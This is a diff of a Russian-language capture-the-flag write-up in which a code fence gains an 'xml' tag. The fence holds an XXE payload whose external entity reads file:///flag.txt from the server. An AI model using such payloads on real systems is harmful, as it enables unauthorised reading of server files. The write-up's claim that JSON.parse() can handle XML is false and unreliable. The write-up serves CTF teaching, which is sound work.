@@ -13,7 +13,7 @@
 
 Заметим, что для десериализации `JSON` в скриптах используется стандартный метод `JSON.parse()`, который, как известно, с таким же успехом способен обрабатывать `XML`. Заменив поле `format` с `JSON` на `XML`, можно с лёгкостью написать `XML`-инъекцию в поле *data*, позволяющую прочитать файл с сервера:
 
-```
+```xml
 <!--?xml version='1.0' ?--><!DOCTYPE replace [<!ENTITY ent SYSTEM 'file:///flag.txt'> ]><data><countries>&ent;</countries><startdate></startdate><enddate></enddate><resttype></resttype></data>
 ```
 
